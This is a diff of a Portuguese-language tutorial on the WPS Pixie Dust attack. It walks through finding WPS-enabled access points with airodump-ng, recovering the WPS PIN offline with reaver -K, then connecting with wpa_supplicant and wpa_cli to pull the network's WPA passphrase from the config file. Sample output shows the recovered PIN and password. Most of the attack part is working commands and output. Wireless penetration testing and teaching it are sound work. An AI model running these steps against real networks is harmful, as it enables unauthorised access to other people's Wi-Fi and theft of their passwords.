@@ -9,25 +9,19 @@ description: 'Nesse artigo faço um pequena demonstração de como exlporar uma 
 
 texto original: https://github.com/geleiaa/wirelesssss/blob/main/WPS_pixiedust.md
 
-O pixie dust attack consiste em realizar a quebra do WPS de maneira offline.O método offline 
-envolve tentar apenas um PIN aleatório e coletar algumas informações durante o processo. Esses 
-dados podem ser usados posteriormente para tentar o ataque pixie-dust.
-A vulnerabilidade está na mensagem M3: no corpo da mensagem é utilizado
-duas chaves AES de 128 bits randômicas (E-S1 e E-S2) para encriptação da
-primeira e da segunda metade do PIN, respectivamente. Se as duas chaves
-forem descobertas, é possível recuperar o número PIN com um ataque offline
-em menos de um segundo, em vez de “chutar” o número PIN no roteador, processo que pode levar de 8 a 12 horas (mais informações sobre o brute-force offline aqui [Hacklu2014_offline_bruteforce_attack_on_wps.pdf](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)
+#### O pixie dust attack consiste em realizar a quebra do WPS de maneira offline. O método offline envolve tentar apenas um PIN aleatório e coletar algumas informações durante o processo. Esses dados podem ser usados posteriormente para tentar o ataque pixie-dust.
+#### A vulnerabilidade está na mensagem M3: no corpo da mensagem é utilizado duas chaves AES de 128 bits randômicas (E-S1 e E-S2) para encriptação da primeira e da segunda metade do PIN, respectivamente. Se as duas chaves forem descobertas, é possível recuperar o número PIN com um ataque offline em menos de um segundo, em vez de “chutar” o número PIN no roteador, processo que pode levar de 8 a 12 horas (mais informações sobre o brute-force offline aqui: [Hacklu2014_offline_bruteforce_attack_on_wps.pdf](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)
 
-
+>___
 ## Parte pratica
-##### Com a interface em modo monitor você pode "sniffar" as redes em volta para identificar um alvo em potêncial com o airodump-ng adicionando a flag --wps dessa forma:
+Com a interface em modo monitor você pode "sniffar" as redes em volta para identificar um alvo em potêncial, usando o airodump-ng adicionando a flag **--wps** dessa forma:
 
-$ sudo airodump-ng --wps <interface>
+#### *sudo airodump-ng --wps (interface)*
 
 
 > Repare na coluna WPS 
 
-
+```bash
  CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
                                                                                                             
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  WPS  AUTH  ESSID
@@ -42,20 +36,20 @@ $ sudo airodump-ng --wps <interface>
  (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
  00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
  00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy
+```
 
 
+Os APs com o WPS ativado vão aparecer nessa coluna junto com a versão do wps que o AP possui. Quando o wps está desativado essa coluna ficara vazia.
 
-##### Os APs com o WPS ativado apareceram nessa coluna com a versão do wps que o AP possui. Pode acontecer de alguns APs ficarem com um espaço vazio nessa coluna, isso é porque o wps está desativado.
-
-##### Depois de ter identificado seu alvo, a ferramenta utilizada para fazer o ataque ao WPS será a Reaver (link no final da pg) com o seguinte comando:
+>___
+Depois de ter identificado seu alvo, a ferramenta para fazer o ataque foi a *Reaver* (link no final da pg) com o seguinte comando:
   
 
-sudo reaver -i <interface> -c <channel> -b <mac do ap> -vv -K 1
-(precisa da flag -vv)
+#### *reaver -i (interface) -c (channel) -b (mac do ap) -vv -K* (precisa da flag -vv)
 
-##### O resultado pode variar um pouco porque depende muito do roteador que está sendo atacado. Essa falha é relativa ao firmware do roteador, não sendo todos os roteadores vulneráveis. Você pode ver alguns exemplos de saida aqui -> https://forums.kali.org/showthread.php?25123-Reaver-modfication-for-Pixie-Dust-Attack ou pesquisar por conta própria e ver vários resultados diferentes que as pessoas conseguem por ai ... mas saída que deu certo pra mim foi semelhante a essa:
+O resultado pode variar um pouco porque depende muito do roteador que está sendo atacado. Essa falha é relativa ao firmware do roteador, não sendo todos os roteadores vulneráveis. Você pode ver alguns exemplos de saida aqui -> https://forums.kali.org/showthread.php?25123-Reaver-modfication-for-Pixie-Dust-Attack ou pesquisar por conta própria... mas saída/resultado que deu certo pra mim foi semelhante a essa:
 
-
+```bash
 $ sudo reaver -i <interface> -c <channel> -b 01:D0:30:4A:49:45 -vv -K 1
 
 Reaver v1.6.5 WiFi Protected Setup Attack Tool
@@ -98,13 +92,16 @@ db396a9e4066be20697a0e236d3aaef7 -r
  [+] WPS pin:  18630248   <==== PIN AQUI
 
  [*] Time taken: 0 s 294 ms
+``` 
 
+(você pode executar o comando "pixiewps" sugerido pela própria ferramenta, que o resultado trará o mesmo pin recuperado)
 
-(você pode executar o comando "pixiewps" sugerido pela própria ferramenta, que trará o mesmo resultado do pin recuperado)
+>___
+Dependendo do resultado do ataque, o reaver consegue recuperar apenas o PIN do WPS como mostrado acima. Nos meus testes foi esse resultado que consegui, então a idéia é essa: *recuperar o PIN com o ataque offline pixie-dust, depois se conectar ao AP com o pin recuperado usando o passo a passo abaixo, para depois pegar o psk*, vam bora!!!
 
-##### Dependendo do resultado do ataque, o reaver consegue recuperar apenas o PIN do WPS como mostrado acima. Nos meus testes foi esse resultado que consegui, então a idéia é essa: recuperar o PIN com o ataque offline pixie-dust, depois se conectar ao AP com o pin recuperado usando o procedimento abaixo, para então pegar o psk
+***
+#### 1. Crie o arquivo com o nome *wpa_supplicant.conf* no diretório */etc/* e nesse arquivo vão as seguintes linhas:
 
-1. ***Crie o arquivo wpa_supplicant.conf em /etc/ e nesse arquivo vai as seguintes linhas***:
 
 > ctrl_interface=/var/run/wpa_supplicant
 >  
@@ -113,22 +110,25 @@ db396a9e4066be20697a0e236d3aaef7 -r
 > update_config=1
   
 
-2. ***Inicie o wpa_supplicant, com o arquivo de configuração /etc/wpa_supplicant.conf***:
+#### 2. Inicie o wpa_supplicant, com o arquivo de configuração */etc/wpa_supplicant.conf* com o seguinte comando:
   
-$ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
+> $ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
 
 
   
-3. ***Em outro terminal inicie o wpa_cli para realizar a conexão ao ponto de acesso por meio do número PIN***:
-  
-$ wpa_cli wps_reg 74:EA:3A:E1:E8:66 02283470
-                     <mac do ap>    <pin wps>
+#### 3. Em outro terminal inicie o *wpa_cli* para realizar a conexão ao AP por meio do número PIN com o seguinte comando:
+
+> $ wpa_cli wps_reg 74:EA:3A:E1:E8:66 02283470
+
+                         ^                ^
+                         |                |
+>                    (mac do ap)     (pin wps)
 
   
   
-4. ***O wpa_supplicant fará a conexão ao ponto de acesso. No terminal em que o wpa_supplicant foi iniciado
-é retornado uma mensagem de que a conexão foi bem-sucedida***:
-  
+#### 4. O wpa_supplicant fará a conexão com AP. No terminal em que o *wpa_supplicant* foi iniciado será retornado uma mensagem de que a conexão foi bem-sucedida:
+
+```bash
 $ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
 ioctl[SIOCSIWENCODEEXT]: Invalid argument
 ioctl[SIOCSIWENCODEEXT]: Invalid argument
@@ -138,23 +138,23 @@ wlan0: Associated with 74:ea:3a:e1:e8:66
 wlan0: WPA: Key negotiation completed with 74:ea:3a:e1:e8:66 [PTK=CCMP GTK=CCMP]
 wlan0: CTRL-EVENT-CONNECTED - Connection to 74:ea:3a:e1:e8:66
 completed (auth) [id=1 id_str=]
-
+```
   
   
-5. ***Visualize o conteúdo do arquivo /etc/wpa_supplicant.conf com a senha
-wireless da rede***:
+#### 5. Visualize o conteúdo do arquivo */etc/wpa_supplicant.conf* com a senha do AP:
 
+```bash
 $ cat /etc/wpa_supplicant.conf
 network={
 ssid="TP-LINK_E1E866"
 bssid=74:ea:3a:e1:e8:66
-psk="senha123"
+psk="senha123" <----- AQUI Ó
 proto=RSN
 key_mgmt=WPA-PSK
 pairwise=CCMP
 auth_alg=OPEN
 }
-
+```
 
 referencia:
 - https://novatec.com.br/livros/pentest-redes-sem-fio/
